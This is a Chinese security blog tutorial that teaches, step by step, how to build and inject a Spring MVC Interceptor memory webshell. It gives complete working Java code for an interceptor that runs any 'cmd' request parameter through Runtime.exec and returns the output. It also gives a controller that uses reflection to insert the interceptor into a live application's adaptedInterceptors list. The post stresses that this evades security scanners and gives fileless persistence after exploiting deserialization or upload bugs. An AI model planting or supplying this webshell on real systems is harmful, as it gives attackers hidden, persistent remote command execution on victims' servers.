#  java内存马之-Spring-Interceptor-手把手投喂内存马  
原创 三呼呼
                        三呼呼  古月安全   2026-04-13 01:40  
  
**导语**  
  
在Spring MVC中，Interceptor和Controller（[java内存马之-Spring-Controller-手把手投喂内存马](https://mp.weixin.qq.com/s?__biz=Mzk5MDI5NDAyMw==&mid=2247485335&idx=1&sn=ba6d51ab7343f34670278f0ebe635b6a&scene=21#wechat_redirect)  
）都可以被用来实现内存马，但攻击者通常优先选择Interceptor。其可以在请求到达Controller之前和之后执行代码。它能够拦截多个Controller的请求。而Controller是处理特定请求的处理器，它只对映射到其上的请求路径起作用。这跟tomcat的中的内存马filter（过滤器）与servlet的执行过程几乎差不多，而Interceptor是spring中的拦截器。  
  
单在spring中我们一般会优先选用Interceptor作为内存马，而不是controller，其主要原因如下：  
  
隐蔽性对比：  
  
Interceptor：由于Interceptor不直接与特定的URL映射关联，它通常不会在路由表中暴露，因此更难被扫描和检测。   
  
Controller：Controller通常通过注解（如@RequestMapping）与特定URL映射关联，这些映射信息在Spring中是可查询的，因此更容易被安全扫描工具发现。  
  
动态注册技术对比：  
  
Interceptor：通过实现WebMvcConfigurer接口，可以动态添加Interceptor，而且可以全局生效。动态注册一个Interceptor相对简单，且不需要破坏现有的Controller结构。其通常不依赖具体的业务逻辑，可以独立于业务代码存在。   
  
Controller：动态注册Controller需要修改Spring MVC的路由映射，更复杂，需要定义具体的处理逻辑，而且容易与现有路由冲突，引起异常。  
  
触发阶段：  
  
Interceptor：可以在请求处理的前后多个阶段进行控制，类似tomcat的filter，比如在预处理、后处理和完成后的处理，因此可以更灵活地操纵请求和响应。其在controller之前执行。   
  
Controller：只能在映射的请求到达时执行，并且需要处理具体的业务逻辑。****  
  
**小结**  
1. 优先选择Interceptor作为内存马主要是因为：  
  
1. 隐蔽性优先 - 不新增路由端点，避免安全扫描   
  
1. 控制范围广 - 单一注入点覆盖所有请求路径    
  
1. 技术实现简洁 - 标准接口实现，注册机制稳定可靠   
  
1. 系统影响小 - 异常情况下对业务影响可控   
  
1. 检测难度高 - 在框架层面运作，传统安全设备难以识别  
  
**什么是Interceptor**  
  
Interceptor（拦截器） ：是 Spring MVC 框架中的一种核心组件，一种用于在请求处理过程中进行拦截和处理的机制，实现对 HTTP 请求的拦截和处理，从而实现对 Web 请求的精细化控制和统一处理。  
  
这句话看起来似曾相识，是的，这个能力与java中的filter（[java内存马之-filter-手把手教你写内存马](https://mp.weixin.qq.com/s?__biz=Mzk5MDI5NDAyMw==&mid=2247484732&idx=1&sn=e1fa8ce654144f6c2ed9eeedda2c320c&scene=21#wechat_redirect)  
）非常相像，而spring中的controller与Java servlet也非常相似，再次证明了上一个文章说的spring其实是运行在tomcat之上的。Interceptor 与 Filter 高度相似，都专注于对“请求-响应”流程的干预和控制-对比如下：  
  
Interceptor-VS-filter  
<table><tbody><tr><th><p><span leaf="">维度</span></p></th><th><p><span leaf="">Interceptor (Spring MVC)</span></p></th><th><p><span leaf="">Filter (Java Servlet)</span></p></th></tr><tr><td><p><strong><span leaf="">核心目标</span></strong></p></td><td><p><strong><span leaf="">干预请求处理过程</span></strong></p></td><td><p><strong><span leaf="">干预请求处理过程</span></strong></p></td></tr><tr><td><p><strong><span leaf="">执行时机</span></strong></p></td><td><p><span leaf="">在 Controller</span><strong><span leaf="">之前</span></strong><span leaf="">和</span><strong><span leaf="">之后</span></strong><span leaf="">执行</span></p></td><td><p><span leaf="">在 Servlet</span><strong><span leaf="">之前</span></strong><span leaf="">和</span><strong><span leaf="">之后</span></strong><span leaf="">执行（包裹了Interceptor）</span></p></td></tr><tr><td><p><strong><span leaf="">工作模式</span></strong></p></td><td><p><strong><span leaf="">“拦截”和“处理”</span></strong></p></td><td><p><strong><span leaf="">“过滤”和“处理”</span></strong></p></td></tr><tr><td><p><strong><span leaf="">控制能力</span></strong></p></td><td><p><span leaf="">可以阻止请求继续传递（</span><code><span leaf="">preHandle</span></code><span leaf="">返回</span><code><span leaf="">false</span></code><span leaf="">）</span></p></td><td><p><span leaf="">可以阻止请求继续传递（</span><code><span leaf="">FilterChain.doFilter</span></code><span leaf="">）</span></p></td></tr><tr style="height: 35px;"><td><p><strong><span leaf="">应用场景</span></strong></p></td><td><p><span leaf="">权限检查、日志记录、性能监控、通用数据处理</span></p></td><td><p><span leaf="">字符编码设置、安全过滤、压缩响应、XSS防御</span></p></td></tr></tbody></table>  
  
**Interceptor实现**  
  
实现一个有效的 Spring Interceptor 需要满足以下几个关键要求：  
  
1.Interceptor类必须实现 HandlerInterceptor 接口，重写preHandle()方法。  
  
2.需要通过一个配置类显式将Interceptor类注册到拦截器链中  
  
3.配置类需要实现WebMvcConfigurer接口，重写addInterceptor()方法。  
  
现在依次实现：  
  
实现1.首先新建一个TestInterceptor.java类，代码如下：  
```
package com.example.demo.demos.web;
import org.springframework.web.servlet.HandlerInterceptor;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
public class TestInterceptor implements HandlerInterceptor {
    @Override
public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        System.out.println("Interceptor执行");
        return HandlerInterceptor.super.preHandle(request, response, handler);
    }
}
```  
  
实现2和3：新建一个配置类InterceptorConf.java，用于注册TestInterceptor。  
```
package com.example.demo.demos.web;
import org.springframework.context.annotation.Configuration;
import org.springframework.web.servlet.config.annotation.EnableWebMvc;
import org.springframework.web.servlet.config.annotation.InterceptorRegistry;
import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;
@Configuration
@EnableWebMvc
public class InterceptorConf implements WebMvcConfigurer {
    @Override
public void addInterceptors(InterceptorRegistry registry) {
        registry.addInterceptor(new TestInterceptor()).addPathPatterns("/**");//设置所有页面经过过滤器
    }
}
```  
  
完成，启动看以下效果：因为设置所有页面addPathPatterns("/*")均通过过滤器，启动之后访问http://127.0.0.1:8080/a 任意页面即可看到过滤器执行了！  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/ic8BH9EFusn7L1FA9T0TmfubPuKXefu9Op9ZsxmHfsBj5ia9Uicl6UJujo3WAdS36WHAic6OqQ6SoCGGZZ045Ehv60IfF6hv030CDyWHMJ7kO7E/640?wx_fmt=webp&from=appmsg "")  
  
**Interceptor执行**  
  
回到TestInterceptor.java类文件，看看其重写的方法各个参数：  
  
public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception { 有requet，response，handler，都是熟悉的味道！  
  
既然有requet，response那么首先想到的就是直接可以在这里通过requet的参数执行命令，通过response返回命令结果。  
  
那么Interceptor就可以通过该方法达到对用户的数据进行校验，过滤的目的了---高度相似filter。  
  
实验下，修改以下TestInterceptor代码如下：做一个简单的XSS拦截器  
```
package com.example.demo.demos.web;
import org.springframework.web.servlet.HandlerInterceptor;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
public class TestInterceptor implements HandlerInterceptor {//实现接口
@Override
public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        String cmd = request.getParameter("cmd");//请求参数cmd
        if (cmd.contains("script")){//过滤条件
            response.getWriter().println("XSS attack!!!");
            return false;
        }
        return true;
    }
}
```  
  
启动项目！随便访问任意页面，然后get请求cmd参数如果包含script，即拦截成功：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ic8BH9EFusn5zTeM4f2msbuOZLG6MwGcCBJIIuFCtpKCA467tNJQZxx4r34xpLNETcc5goN13MwxsJ4l3mbazgg5L9qw9yvgDGhHDMRQXNVU/640?wx_fmt=webp&from=appmsg "")  
  
既然可以拦截请求，那么执行恶意代码也是可以的：再次修改TestInterceptor代码，执行命令：  
```
package com.example.demo.demos.web;
import org.springframework.web.servlet.HandlerInterceptor;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
public class TestInterceptor implements HandlerInterceptor {//实现接口
@Override
public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        String cmd = request.getParameter("cmd");
        if (cmd !=null){
            Process process = Runtime.getRuntime().exec(cmd);//执行cmd命令
// 读取输出
java.io.InputStream input = process.getInputStream();//获取命令结果的输入流
java.util.Scanner scanner = new java.util.Scanner(input).useDelimiter("\\A");//将该输入流放入Scanner读取内容
String output = scanner.hasNext() ? scanner.next() : "命令执行完成，但无输出";//逐行获取执行结果
scanner.close();
            // 等待进程完成
process.waitFor();
            response.getWriter().println(output);//通过response返回输出结果至前端
return true;
        }
        return true;
    }
}
```  
  
启动，任意页面执行成功：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ic8BH9EFusn4wfhgCXJo1wo30Hic3THH7UPxPKk5iapOiaMsU64IqAwgcIfG7xr4fx6b9ut30B9hcbrm3RibkbcEhuVh2GVw6L0RbrULVrR3Z3MQ/640?wx_fmt=webp&from=appmsg "")  
  
**注册Interceptor过程分析**  
  
通过Interceptor确实可以执行系统命令，且逻辑也与filter一样，那么只需要像filter一样，通过动态的将其注册到应用中即可。在上面通过InterceptorConf.java文件将其注册为Interceptor，让其生效。接下来就是找到这个注册过程，然后在其中的某个属性中加入我们自己的Interceptor即可完成内存马注入！就不需要通过config文件的方式注册了。  
  
同样通过调试的方式看看其加载流程，在TestInterceptor.java文件中的重写方法打上断点：  
  
HandlerExecutionChain对象的applyPreHandle()方法调用了我们的重写的preHandle()方法，并且其有个属性interceptorList，里面的第一个元素就是我们自定义的TestInterceptor对象，通过for循环，逐一调用每个元素的applyPreHandle方法。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ic8BH9EFusn6ichicUmcKfgs3BicdpWgQWXDFpu98V6R0nic0VB0QZbYI9vmkLnXDJiagAZib7dDIUIjcWolTexeDgapwHiczumQNia2sQkqfPnybkaw/640?wx_fmt=webp&from=appmsg "")  
  
那么这里就很明显了，只要这个interceptorList里面有的HandlerInterceptor，到这里就会自动调用执行。只要想办法把值加入就可以了。这个interceptorList属性是一个List，并且存放HandlerInterceptor对象。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ic8BH9EFusn4WpDibpt9GmibnXCuK6iaKHM3jH859SSJuXQAOr22FY8LCReaAbwaVAce01fmU8XjtSQ3KREK9BO6s4d7VQRnqibrica27LWwEJRXs/640?wx_fmt=webp&from=appmsg "")  
  
而其赋值是通过addInterceptor方法：  
```
public void addInterceptor(HandlerInterceptor interceptor) {
    this.interceptorList.add(interceptor);
}
```  
  
将其赋值这里打上断点，重新调试：果然是到了这里，是其他地方通过参数传过来的，看看这个参数是谁传过来的。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/ic8BH9EFusn5Sc5IqcZ9WibSdZIicD8mt1LbweTcRR3nmYA8V34gXL4pw4V17xK3DRM2sicp4j46BrXbrXj6icnL62HytdQbOCEJnGSzXhjHBFFw/640?wx_fmt=other&from=appmsg "")  
  
如图可以看到，通过这个**adaptedInterceptors变量**  
获取的TestInterceptor对象。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/ic8BH9EFusn5ntSdWFdQh8GoQLJ6uAMUiaBs9VL5ib7NGYKB6EdSTaeyAErLANQbHbY85yccoQOB2JFTneS9ZuyrOHib61fxZDXbl4JiaKibkbaaI/640?wx_fmt=other&from=appmsg "")  
  
而**adaptedInterceptors变量又是AbstractHandlerMapping类的一个List属性**  
。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ic8BH9EFusn4GCibeEdhgHCmS9N7WH7qibH9W1M3DaMPkQz9rSkUUzDmyofF3MSqpq7XKlJUEvdSM5iawLian3aDosic6KdlmQvba2gWMExfCajrg/640?wx_fmt=other&from=appmsg "")  
  
继续看他的赋值：他来自另外一个List interceptors属性：  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/ic8BH9EFusn7k610eJqJwh2Kus7EApzZIxXVibvPownjguiaUfrRsjCBAIgG2nWT7PwID7h8C9U9hI6ibqib0D4E3EicfdjvicElGia8iacAB09oAOicU/640?wx_fmt=webp&from=appmsg "")  
  
**initInterceptors()方法**  
中从interceptors逐一取值，赋值给adaptedInterceptors。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/ic8BH9EFusn7Jp7UGJ4E2lr37xQD7p9NC8Dibt7cFCEqmqRicuVL8UR2h2NQICYjUpiavE31us3SicicJw59ibmHMtZEHVHMgVZNycHXYWwzTqx7q4/640?wx_fmt=webp&from=appmsg "")  
  
而这个interceptors属性来自其赋值方法setInterceptors()：关键点就要知道谁调用了这个方法给他赋值：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ic8BH9EFusn4OBpBytaHmQXe8Z0ZlSdxztMfCWfycIMXmVWTk3aqnRZHtucPuYwdwV8gf9SBjDHDTLuicAkEiaRTFbyUY4ia5eK3YrAlqa488T0/640?wx_fmt=webp&from=appmsg "")  
  
**项目启动阶段赋值：**  
  
**这里打上断点，重新启动调试：从初始化开始，再看看谁调用这个方法：来自WebMvcConfigurationSupport类的RequestMappingHandlerMapping()方法，而且这个方法的调用属于是服务器启动时就会执行的初始化赋值，将项目中的所有配置写入的一个阶段。**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ic8BH9EFusn5002EN4Pxnt7F0Wt2cQ67vMYTmz8RHc93ibzzWib5sPKCDFOr2zacAicPLrVDY8RU1B9ib312iamZgcUHHMsGibdPLOEzRz0fM7fiaNg/640?wx_fmt=webp&from=appmsg "")  
  
而通过调用这个内层的方法getInterceptors(conversionService, resourceUrlProvider) ，完成了初始化，将项目中我们写的这个TestInterceptor存入interceptors中--**这里相当于启动项目就会有的初始值，这里的调用也是项目启动的时候就会执行的。**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ic8BH9EFusn6Xe2aIs2ibQYHdI995OPtol4Jc5ZPmG0aCqqibibyKCh34Ukibia8TkaToFVOCFfPibyu5dEFK048bygO8F9L2hqI2UYwETYT5SyLs8/640?wx_fmt=webp&from=appmsg "")  
  
并且将结果返回到	mapping.setInterceptors(getInterceptors(conversionService, resourceUrlProvider));相当于又执行了mapping.setInterceptors(interceptors)。  
  
而这里的interceptors就如上图所示，主要通过registry的addInterceptor()方法添加过滤器。注册过程spring自动完成，这里不关注细节：如下图！得到就是添加好数据的interceptors，作为参数给mapping.setInterceptors(interceptors)  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/ic8BH9EFusn7icibOmIW4zEC7JszEzaBUJEz83lD9CUYSfjYpkfysfQ4PMCxWoA0HJoiahvebI6lFUWhA2zO83HpSs8v9rw6rsncle7Ae3iaB530/640?wx_fmt=webp&from=appmsg "")  
  
**添加完成之后，回到**  
mapping.setInterceptors**调用方法的地方：而这里的mapping是一个RequestMappingHandlerMapping对象，它是AbstractHandlerMapping类的子子类。**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ic8BH9EFusn67NKOlm0snAzW3botVBD0n8hN232nibGBUDd4uBdR12nQDUPLXEMibSzslDVYTtSKzgGXmRDTsic98kbiaBnQpwdJgO46QFL9Ny9k/640?wx_fmt=webp&from=appmsg "")  
  
通过setInterceptors()方法赋值给interceptors了，**这样该对象RequestMappingHandlerMapping就拥有了一个有值的interceptors属性了**  
，如下图：  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/ic8BH9EFusn7gvZQAs2uzoKsSpyO9b26h5fxGuz4Jk44JGXFJ4vk5IUzZeNJ1f3ZlT3CNHnXibDecpgsIgOnyzjXK8xu2p8AHQxrkdVcDd5sA/640?wx_fmt=webp&from=appmsg "")  
  
这个赋值的地方，前面已经看到过了，这样就完成了初始化的过程。将项目文件中写好的Interceptor加载到interceptors中了。当前应用启动之后this.interceptors就拥有了我们配置好的TestInterceptor对象。  
  
然后通过initInterceptors()方法，将**interceptors的值，传递给adaptedInterceptors属性**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ic8BH9EFusn6AecRwtgDo15WokwLRD1qRIosONvicmr0xXmCSpibdGFIJCt49uY7XNHs9cIU4g1dGRZfWtZFq084Nlicsz3xqoy0dUZyhkgoPKk/640?wx_fmt=webp&from=appmsg "")  
  
就这样**对象RequestMappingHandlerMapping就拥有了一个有值的interceptors属性了和一个adaptedInterceptors属性，**  
整个赋值流程已经很清晰了。  
  
**小结**  
  
**初始化阶段：通过WebMvcConfigurationSupport类的RequestMappingHandlerMapping()方法创建了一个RequestMappingHandlerMapping对象，并对其属性interceptors进行初始化赋值。并通过interceptors对adaptedInterceptors属性添加Interceptor。**  
  
**request阶段：那么在发起request请求的时候，只需要这个adaptedInterceptors属性中存在的过滤器，就会将其值传递给一个interceptorList变量，然后逐一执行各个元素对应的preHandle重写方法，所以现在想办法动态添加恶意Interceptor对象到adaptedInterceptors中即可。**  
  
**疑问：这里两个属性interceptors属性了和一个adaptedInterceptors均存放了Interceptor对象，为什么选择adaptedInterceptors，而不是interceptors属性，主要是因为在request阶段，interceptorList这个变量的数据来源是adaptedInterceptors它而不是interceptors，尽管adaptedInterceptors是通过interceptors得到的。如下图：**  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/ic8BH9EFusn4QibHzuKPB2C0FuDXARVmUoI9br6cZGMjaoEjHzlU0OAMaJo2icuOPuTNgIC6hBaYRBAxcB6d4ibR6A0d71mykic3AAdAnBxroqNA/640?wx_fmt=webp&from=appmsg "")  
  
**内存马实现**  
  
**前提回顾：**  
重点是获取adaptedInterceptors这个属性，其实前面已经清楚了，在spring启动的时候，通过新建一个RequestMappingHandlerMapping对象，然后对adaptedInterceptors属性进行了初始化的赋值。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/ic8BH9EFusn4M1yyaicazHnRgcCBHoocONkKnyULBR7FbPgxtIg3abjeMqPPCaqBjagO3YLhcGv00iaZsexCeMhJc7ztFyfQDayf6Xpr4bZwME/640?wx_fmt=other&from=appmsg "")  
  
而这个属性是其父类AbstractHandlerMapping持有的属性，为List类型。  
  
而这个属性为私有，所以需要通过反射获取。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ic8BH9EFusn762zuOjUicCB6jhDGhaZb6f62vFicVsYKiaAQw0XwQaqPaA9byQNeezPHNuRrzZ32S2JictuC8Y5IM6snL5GK3ibcFCelwQcxc3picY/640?wx_fmt=other&from=appmsg "")  
  
所以只需要持有RequestMappingHandlerMapping对象，即可拥有对adaptedInterceptors属性的操作权限。而RequestMappingHandlerMapping对象已经很熟悉了，在controller内存马中已经知道可以通过ApplicationContext获取。  
  
直接开始写内存马实现代码了！  
  
**内存马代码实现**  
  
比如通过漏洞在已有的Controller中植入触发代码，或者获得服务器的代码执行权限：这里假设新建一个TestController.java是存在的controller：代码如下：逐行注释  
```
package com.example.demo.demos.web;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.DispatcherServlet;
import org.springframework.web.servlet.HandlerInterceptor;
import org.springframework.web.servlet.handler.AbstractHandlerMapping;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.lang.reflect.Field;
import java.util.List;
@RestController
public class TestController {
    @RequestMapping(value = "/test")
    public String test(){
        System.out.println("test执行");
        return "test!!!";
    }
    @RequestMapping(value = "/injectIn")
    public String injectInter() throws NoSuchFieldException, IllegalAccessException {
        //通过RequestContextHolder获取servletRequestAttributes对象
ServletRequestAttributes servletRequestAttributes = (ServletRequestAttributes) RequestContextHolder.getRequestAttributes();
        if (servletRequestAttributes != null) {
            //获取HttpServletRequest对象，该章节开头做过解释
HttpServletRequest request = servletRequestAttributes.getRequest();
            //通过属性：DispatcherServlet.WEB_APPLICATION_CONTEXT_ATTRIBUTE 获取WebApplicationContext对象
//这里得到了我们需要的context了
WebApplicationContext webApplicationContext = (WebApplicationContext) request.getAttribute(DispatcherServlet.WEB_APPLICATION_CONTEXT_ATTRIBUTE);
            //调用它的getBean()方法按类型获取，获取RequestMappingHandlerMapping对象,因为registerMapping方法是RequestMappingHandlerMapping这个对象的方法，它继承至HandlerMapping
RequestMappingHandlerMapping handlerMapping = (RequestMappingHandlerMapping)webApplicationContext.getBean(RequestMappingHandlerMapping.class);
            //获取父类的属性AbstractHandlerMapping持有两个属性adaptedInterceptors和interceptors
Field interceptors = AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
            interceptors.setAccessible(true);//private属性设置可访权限
List listInterceptors = (List) interceptors.get(handlerMapping);//强转List属性
listInterceptors.add(new TestInterceptor());
        }
        return "succeed！！";
    }
    public class TestInterceptor implements HandlerInterceptor {//实现接口，恶意Interceptor类
@Override
public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
            String cmd = request.getParameter("cmd");//执行命令参数
if (cmd !=null){
                Process process = Runtime.getRuntime().exec(cmd);//执行cmd命令
// 读取输出
java.io.InputStream input = process.getInputStream();//获取命令结果的输入流
java.util.Scanner scanner = new java.util.Scanner(input).useDelimiter("\\A");//将该输入流放入Scanner读取内容
String output = scanner.hasNext() ? scanner.next() : "命令执行完成，但无输出";//逐行获取执行结果
scanner.close();
                // 等待进程完成
process.waitFor();
                response.getWriter().println(output);//通过response返回输出结果至前端
return true;
            }
            return true;
        }
    }
}
```  
  
删除之前的测试代码，只留下TestController.java文件，启动项目：  
  
访问：http://127.0.0.1:8080/injectIn   
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/ic8BH9EFusn5GmXsCibzqYUM8H5Y2RtQIUV99gzH2rKuib3aJM3RVwzNkicdNFw2qBFLmY7iclII6JJuEHJm0rYfaA19qsIolBYDa6YlGdpKhxFg/640?wx_fmt=webp&from=appmsg "")  
  
看到成功提示应该就可以了，然后尝试执行命令：访问任意页面，均可http://127.0.0.1:8080/iadfa?cmd=whoami  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ic8BH9EFusn7YziaIMndByEicp8AxDgZHVfL06ia1oJ1KyeGdLMHTNumKhnbr8xkD0x4BBVbCKW8wWOnlxFnB6JTicib2KJ8cuicu1ox62t1IoblrE/640?wx_fmt=webp&from=appmsg "")  
  
命令执行成功，虽然页面404，但是不影响执行。  
  
**总结**  
  
**Interceptor内存马的利用流程：Interceptor内存马通常通过应用漏洞进行植入，主要写入位置包括利用现有Controller添加恶意方法、创建新的恶意Controller类，或通过其他漏洞动态注册。攻击者借助反序列化、文件上传、表达式注入等漏洞将恶意Interceptor代码注入到Spring容器中，实现无文件落地驻留。动态将恶意Interceptor添加到处理链，通过特定条件激活恶意功能， 内存马在应用生命周期内持续有效。**  
  
